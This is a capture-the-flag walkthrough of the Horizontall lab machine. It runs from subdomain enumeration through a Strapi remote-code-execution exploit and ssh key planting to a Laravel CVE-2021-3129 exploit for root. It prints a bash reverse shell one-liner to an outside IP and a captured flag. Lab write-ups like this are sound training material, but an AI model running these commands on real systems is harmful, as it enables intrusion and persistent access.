# Horizontall.htb
### IP-10.10.11.105 Difficulty-Easy

Started nmap scan on the IP and found 2 open ports:

```
22 - SSH
80 - HTTP
```

Entered the IP and a hostname in the hosts file and started a gobuster scan on the IP to brute directories but got nothing useful.
Then started to brute sub-domains using gobuster itself.

```
gobuster vhost -u horizontall.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

Luckily after much time got a sub-domain:

```
api-prod.horizontall.htb
```

Added this subdomain into the hosts file and started another gobuster scan on this sub-domain.
After enumerating, I found it was using strapi CMS with available exploit of RCE and downloaded the [python](exploit-db.com/exploits/50239) code and executed it.

Got a reverse shell but it was not stable so to get another reverse shell I ran:

```
bash -c 'bash -i >& /dev/tcp/10.10.14.185/5555 0>&1'
```

Got the user.txt.

```
042416f86baccb2d2b1d7e7aed96adc8
```

After that I noticed that some ports are running locally like 3306 and 8000.
Found that 8000 is running laravel php script of version 8.

Found an exploit for this.(cve2021â€“3129)

But for this exploit, I needed to forward the 8000 port so that I can access this port from my machine.

To do this, I used ssh port forwarding.

In my attackbox I created new ssh keys by ssh-keygen and copied the public key into the authorized_keys file in strapi user's .ssh folder.
After that changed permissions of the private ssh file to 600 and then running the command in attackbox.

```
ssh -i id_rsa -L 8000:127.0.0.1:8000 strapi@horizontall.htb
```

After this I successfully forwarded the port to my machine and I can exploit it.

Found [this](https://github.com/nth347/CVE-2021-3129_exploit) exploit for RCE and ran the command:

```
./laravel.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt"
```

And got the root.txt
